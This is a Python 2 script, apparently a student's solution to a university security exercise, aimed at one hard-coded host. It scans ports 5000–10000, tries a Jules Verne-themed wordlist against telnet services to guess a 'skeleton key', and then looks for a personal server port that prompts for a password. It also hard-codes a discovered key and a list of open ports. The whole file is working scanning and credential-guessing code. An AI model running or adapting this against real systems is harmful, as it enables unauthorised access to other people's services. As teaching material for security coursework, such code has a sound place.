#!/usr/bin/env python

import socket
import errno
import requests
from requests.auth import HTTPBasicAuth

import getpass
import sys
import telnetlib

import time

UNAME = 'ceneri' 
IP_ADDRESS = '128.114.59.215'


CURRENT_SKELETON_KEY = "passepartout"
CURRENT_PERSONAL_PORT = 9631
CURRENT_PORTS = [5028, 5071, 5103, 5123, 5264, 5292, 5338, 5357, 5461, 5541, 5743, 5769, 
	5784, 5878, 5882, 5897, 5966, 6033, 6034, 6051, 6192, 6291, 6308, 6367, 6428, 6448, 
	6489, 6585, 6610, 6616, 6652, 6762, 6842, 6942, 6978, 7011, 7029, 7041, 7068, 7138, 7328, 
	7510, 7694, 7765, 7819, 7829, 7919, 7984, 7992, 8009, 8147, 8152, 8212, 8229, 8248, 8314, 
	8392, 8441, 8487, 8500, 8511, 8648, 8659, 8665, 8751, 8757, 8763, 8831, 8849, 8914, 8933, 
	8961, 8966, 9011, 9105, 9111, 9152, 9274, 9392, 9526, 9589, 9631, 9714, 9779, 9890, 9936, 
	9999]


skeletonPossibilities = ['JeanPassepartout', 'Jean_Passepartout', 'Jean-Passepartout',
	 'jeanpassepartout', 'jean_passepartout', 'jean-passepartout',
	 'jeanPassepartout', 'jean_Passepartout', 'jean-Passepartout',
	'jean', 'Jean', 'JEAN', 'passepartout', 'Passepartout', 'PASSEPARTOUT',
	 'JEANPASSEPARTOUT', 'JEAN_PASSEPARTOUT', 'JEAN-PASSEPARTOUT',
	 'JulesVern', 'Jules_Vern', 'Jules-Vern',
	'julesvern', 'jules_vern', 'jules-vern',
	 'julesVern', 'jules_Vern', 'jules-Vern',
	'jules', 'Jules', 'JULES', 'Vern', 'vern', 'VERN',
	 'JULESVERN', 'JULES_VERN', 'JULES-VERN', 'Aouda', 'AOUDA',
	 'PhileasFogg', 'Phileas_Fogg', 'Phileas-Fogg',
	 'phileasfogg', 'phileas_fogg', 'phileas-fogg',
	 'phileasFogg', 'phileas_Fogg', 'phileas-Fogg',
	'phileas', 'Phileas', 'PHILEAS', 'Fogg', 'fogg', 'FOGG',
	 'PHILEASFOGG', 'PHILEAS_FOGG', 'PHILEAS-FOGG',
	 'ReformClub', 'Reform_Club',  'Reform-Club'
	 'reformclub', 'reform_club', 'reform-club',
	 'reformClub', 'reform_Club', 'reform-Club',
	'reform', 'Reform', 'REFORM', 'Club', 'CLUB', 'club',
	 'REFORMCLUB', 'REFORM_CLUB', 'REFORM-CLUB',
	 'GoesEverywhere', 'Goes_Everywhere', 'Goes-Everywhere',
	 'goeseverywhere', 'goes_everywhere', 'goes-everywhere', 
	 'goesEverywhere', 'goes_Everywhere', 'goes-Everywhere',
	 'GOESEVERYWHERE', 'GOES_EVERYWHERE', 'GOES-EVERYWHERE',
	'PASSPORT', 'passport', 'Passport'
	]


def find_open_ports():

	MIN_PORT = 5000
	MAX_PORT = 10000

	openPorts = []

	for port in range(MIN_PORT, MAX_PORT):

		try:

			clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			clientsocket.connect((IP_ADDRESS, port))
			isOpen = clientsocket.send('\n')
			#data = clientsocket.recv(1024)

			if isOpen == 1: 
				openPorts.append(port)
				#print "port", port

		except socket.error, v:
			errorcode = v[0]
			#if errorcode == errno.ECONNREFUSED:
				#print "Conecction refused"

	return openPorts

#https://docs.python.org/2.4/lib/telnet-example.html
def get_skeleton_key(ports):

	HOST = IP_ADDRESS
	#!change to random poort
	RANDOM_PORT = str(ports[5])

	for sKey in skeletonPossibilities:

		tnet = telnetlib.Telnet(HOST, RANDOM_PORT)
		
		try: 
			#print sKey
			tnet.write(sKey + "\n")

			tnet.read_until("Username: ")

			tnet.write(UNAME + "\n")

			return sKey

			#print tnet.read_all()

		except EOFError, v:

			continue
			#print "no"


def find_personal_server(ports, sKey):

	HOST = IP_ADDRESS

	for port in ports:

		print "port", port

		tnet = telnetlib.Telnet(HOST, port)
		
		try: 
			#print sKey
			tnet.write(sKey + "\n")

			tnet.read_until("Username: ")

			tnet.write(UNAME + "\n")

			consoleRead = tnet.read_until("Password: ", 3)

			if consoleRead == "Password: ":
				return port
			else: 
				continue

			#print tnet.read_all()

		except EOFError, v:

			continue
			#print "no"

def main():

	openPorts = find_open_ports()
	print "Total Number of Open Sockets", len(openPorts)
	print openPorts

	skeletonKey = get_skeleton_key(openPorts)
	print "Skeleton Key:", skeletonKey

	personalPort = find_personal_server(openPorts, skeletonKey)
	print "Personal Port:", personalPort


if __name__ == '__main__':
	main()
